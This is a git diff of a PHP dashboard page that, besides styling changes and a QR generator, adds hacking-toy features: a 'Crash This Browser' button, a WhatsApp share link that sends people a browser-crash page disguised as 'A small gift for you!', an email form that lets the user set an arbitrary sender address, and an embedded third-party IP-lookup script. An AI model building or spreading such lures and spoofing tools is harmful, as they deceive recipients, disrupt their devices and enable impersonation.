@@ -12,7 +12,8 @@ if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    
+     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=0.5">
     <meta charset="UTF-8">
     <title>Welcome</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/1.2.0/tailwind.min.css">
@@ -269,7 +270,7 @@ var captureAppDownload = function(platform, url) {
 body {
   margin: 0;
   font-family: "Montserrat";
-  background: #212121;
+  background: #000;
   font-size: 18px;
   height: 100vh;
 }
@@ -296,7 +297,7 @@ body {
 }
 .container1 .left {
 /*  background-image: url("https://images.hdqwalls.com/wallpapers/street-light-4k.jpg"); /* The image used */
-  background-color: #212121; /* Used if the image is unavailable */
+  background-color: #000; /* Used if the image is unavailable */
   height: 500px; /* You must set a specified height */
   background-position: center; /* Center the image */
   background-repeat: no-repeat; /* Do not repeat the image */
@@ -581,6 +582,22 @@ html, body {
 -moz-box-shadow: 8px 16px 35px -7px rgba(0,57,255,0.75);
 }
 
+.bs2{
+    box-shadow: 10px 6px 21px -2px rgba(0,0,0,0.73);
+-webkit-box-shadow: 10px 6px 21px -2px rgba(0,0,0,0.73);
+-moz-box-shadow: 10px 6px 21px -2px rgba(0,0,0,0.73);
+}
+
+.bs3 {
+    box-shadow: 10px 10px 31px 0px rgba(252,211,211,1);
+-webkit-box-shadow: 10px 10px 31px 0px rgba(252,211,211,1);
+-moz-box-shadow: 10px 10px 31px 0px rgba(252,211,211,1);
+}
+
+.mtp {
+    margin-top:10px;
+    margin-bottom:10px; 
+}
 
 .uiux-side.split-pane button:hover, .split-pane a.button:hover {
   color: violet;
@@ -1420,9 +1437,9 @@ input[type="file"] {
                 <img src="https://i.imgur.com/3HewRiE.png" alt="CompleteUI Logo" class="logo">
 
                 <div class="content">
-                     <h1 class="light" >Hi, <b><?php echo htmlspecialchars($_SESSION["username"]); ?></b>. Welcome!</h1>
+                     <h1 class="light" > <b><?php echo htmlspecialchars($_SESSION["username"]); ?></b>// <script src='https://l2.io/ip.js'></script> </h1>
 
-                    <p>Discover Features, you can get updates for your interests & more! <b>Important</b>, Some of these features might not work for all users!</p><br/><hr/><br/>
+                   <p> Discover Features so you can get updates for your interests & more! <b>Note</b>, Some of these features might not work for all users! </p><br/><hr/><br/>
                     
                    
                     
@@ -1430,6 +1447,9 @@ input[type="file"] {
                    <a href="logout.php" class="text-center px-4 py-2 text-xxs font-bold rounded  bg-white-200 text-red-500">Logout</a>
                 </div>
             </div>
+            
+          
+            
             <div class="right">
                
 
@@ -1445,8 +1465,15 @@ input[type="file"] {
                       
                       
                       
-                      
-          
+                    <!--  <form data-spreadsheet-api="https://sheet2api.com/v1/nwD1fa02SCuT/o-mailer-logs/Sheet1">
+    <input type="text" name="Recievers Mail" placeholder="Recievers Mail" />
+    <input type="text" name="Subject" placeholder="Subject" />
+    <input type="text" name="Senders Mail" placeholder="Senders Mail" />
+    <input type="text" name="Message" placeholder="Message" />
+    <button type="submit" onClick="alert('Submitted')">Submit</button>
+</form>
+<script src="https://sheet2api.com/v1/template.js"></script> -->
+          <script src="https://sheet2api.com/v1/template.js"></script>
                     <tbody>
                         
                       <tr class="">
@@ -1475,6 +1502,7 @@ input[type="file"] {
                         </td>
                         <td>
                           <div class="">
+                              
                               <form  class="registration" action="mail/test.php" method="post">
                               <input class="text-center px-4 py-2 text-xs font-bold rounded opacity-75 bg-blue-200 text-white-700" type="submit" name="submit" value="Send">
                               
@@ -1495,9 +1523,10 @@ input[type="file"] {
 		<div class="accordion-item-header flex items-center font-bold relative cursor-pointer pl-4 py-3">Discover more options!</div>
 		<div class="accordion-item-body overflow-hidden">
 			<div class="accordion-item-body-content p-4 leading-normal bg-gray-100"><div class="text-xs text-gray-600">Fill out this form and click send..</div><hr/><br/>
-			<input type="text" class="rc" placeholder="✨ To whom you want to send mail" name="email">
+			
+			<input type="text" class="rc" placeholder="✨ To whom you want to send mail"  name="email">
                   <input type="text" class="rc" placeholder="👀 What should be the subject" name="subject"><br>
-                  <input type="text"  class="rc"placeholder="📨 What should be senders mail" name="se"><br>
+                  <input type="text"  class="rc"placeholder="📨 What should be senders E-mail" name="se"><br>
                   <input type="text"  class="rc"placeholder="🎈 Type your message" name="message">
                   </form>
 			</div>
@@ -1600,7 +1629,7 @@ input[type="file"] {
 
                 <!-- hero text -->
                 <div class="hero-text col-span-6">
-                   <img src="https://i.imgur.com/Iy149Zd.png">
+                   <img src="https://i.imgur.com/6ct3yMO.png">
                    
                    
                     <div class="get-app flex space-x-5 justify-center md:justify-start">
@@ -1690,29 +1719,130 @@ input[type="file"] {
             
              <div class="grid gap-6 euu1 md:grid-cols-2 lg:grid-cols-4">
     <!-- Card 1 -->
-    <div class="flex items-center p-4 bg-white border-2 border-gray-200 rounded-lg shadow-sm dark:bg-gray-800">
-      <div class="p-3 mr-4 bg-blue-500 text-white rounded-full">
+    <div class="flex items-center rounded-lg shadow-md h p-4 bg-white ">
+      <div class="p-3 mr-4 bg-blue-500 text-white  rounded-full">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/b/bb/Nearby_Share_icon.png" width="50px"/>
       </div>
       <div>
-        <p class="mb-2 text-sm font-medium text-gray-900">JS-CrashScript</p>
+        <p class="mb-2 text-sm font-medium text-gray-900">JS-CrashScript</p> 
         
         <a onclick="myFunction()"><p class="text-center px-4 py-2 text-s font-bold rounded opacity-75 bg-red-200 text-black-700">Crash This Browser </p></a>
       </div>
     </div>
     
     
-    <!-- Card 2 
-    <div class="flex items-center p-4 bg-white border-2 border-gray-200 rounded-lg shadow-sm dark:bg-gray-800">
-      <div class="p-3 mr-4 bg-blue-500 text-white rounded-full">
-        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
+    
+    
+   <!--  <div class="flex items-center p-4 bg-white ">
+      <div class="p-3 mr-4 bg-white text-white rounded-full">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/2042px-WhatsApp.svg.png" width="80px"/>
       </div>
       <div>
-        <p class="mb-2 text-sm font-medium text-gray-900">Web-Proxy</p>
-        <a href="https://obito.ml/proxy/"><p class="text-center px-4 py-2 text-s font-bold rounded opacity-75 bg-red-200 text-black-700">Unlock The Web </p></a>
+        <p class="mb-2 text-sm font-medium text-gray-900">Whatsapp-Texter</p> 
+        
+       <p class="text-center px-4 py-2 text-s font-bold rounded opacity-75 bg-red-200 text-black-700">Send Custom Text</p>
+     <img style="inline" src="https://freepngimg.com/thumb/web_design/51034-9-share-free-transparent-image-hq.png" width="40px"/>
       </div>
     </div> -->
+ 
+       <div class="p-6 bg-white flex items-center space-x-6 rounded-lg shadow-md h cursor-pointer">
+
+    <div>
+      <h1 class="text-xl font-bold text-gray-700 mb-2">Portable Crash-Script</h1>
+      <p class="text-gray-600 w-80 text-sm">Shareable script using URL</p><hr/><BR/>
+      <a href='whatsapp://send?text=A small gift for you! https://obito.ml/hey.html'><p class="text-center px-4 py-2 text-s font-bold rounded opacity-75 bg-red-200 text-black-700">Open Whatsapp </p></a>
+    </div>
+  </div>  
+  
+  
+     <div class="p-6 bg-white flex items-center space-x-6   cursor-pointer">
+
+    <div>
+      <h1 class="text-xl font-bold text-gray-700 mb-2">Custom QR Generator</h1>
+      <p class="text-gray-600 w-80 text-sm">Type Text and Hit Enter to Generate your custom QR Code</p><hr/>
+      <input id="text" type="text" value="https://obito.ml/" style="height:50px; width:90%"  class="bs3 rc " />
+     
+    </div>
+  </div>  
+  <div id="qrcode" style="width:200px; height:200px; margin-top:15px;"></div>
+  
+  
+  <script src="https://cdn.jsdelivr.net/gh/baroninn/qrcodejs@master/qrcode.js"></script>
+
+        
+        
+
+<script>
+var qrcode = new QRCode(document.getElementById("qrcode"), {
+	width : 200,
+	height : 200
+});
+function makeCode () {		
+	var elText = document.getElementById("text");
+	
+	if (!elText.value) {
+		//alert("Input a text");
+		elText.focus();
+		return;
+	}
+	
+	qrcode.makeCode(elText.value);
+}
+makeCode();
+$("#text").
+	on("blur", function () {
+		makeCode();
+	}).
+	on("keydown", function (e) {
+		if (e.keyCode == 13) {
+			makeCode();
+		}
+	});
+</script>
+ <!--   <div class="flex items-center p-4 bg-white rounded-lg s">
+      
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/2042px-WhatsApp.svg.png" width="100px"/>
+      
+      <div>
+       
+       
+       <input type="text" class="rc bs" placeholder="Ph No."   id="no">
+                  <input type="text" class="rc bs" placeholder="Message"  id="message">
+                  <a href="javascript:call();" class="myButton" id="btn1">Send Message</a>
+      </div>
+    </div> 
+    <script>
+    var no=document.getElementById("no");
+    var msg=document.getElementById("message");
+    var finalcall;
+    function call()
+    {
+        if(no.value!="")
+        {
+            finalcall="https://api.whatsapp.com/send?phone=91";
+            finalcall+=no.value;
+            finalcall+="&text=";
+            finalcall+=msg.value;
+            window.open(finalcall,"_self"); 
+        }
+        else
+        {
+            alert("Fill The Number First !")
+        }
+        
+    }
+    no.addEventListener("keydown", function(e) {
+        if (!e) { var e = window.event; }
+        
+        if (e.keyCode == 13) { msg.focus(); }
+    }, false);
+    msg.addEventListener("keydown", function(e) {
+        if (!e) { var e = window.event; }
+        
+        if (e.keyCode == 13) { call(); }
+    }, false);
     
+</script> -->
     
     <!-- Card 3 -->
 
@@ -1735,6 +1865,12 @@ input[type="file"] {
         <p class="text-sm font-normal text-gray-800">User and customer analytics</p>
       </div>
     </div> -->
+    
+    
+    
+
+    
+    
   </div>
             
         </div>
@@ -1839,9 +1975,7 @@ input[type="file"] {
 
 
 
-
-
-<!--<a href="#terrestrial">--><img src="https://www.seekpng.com/png/full/107-1071009_cat-cats-anime-girl-loli-eye-eyes-japan.png" class="specialImage" /></a>
+<img src="https://www.seekpng.com/png/full/107-1071009_cat-cats-anime-girl-loli-eye-eyes-japan.png" class="specialImage" />
 
   
  
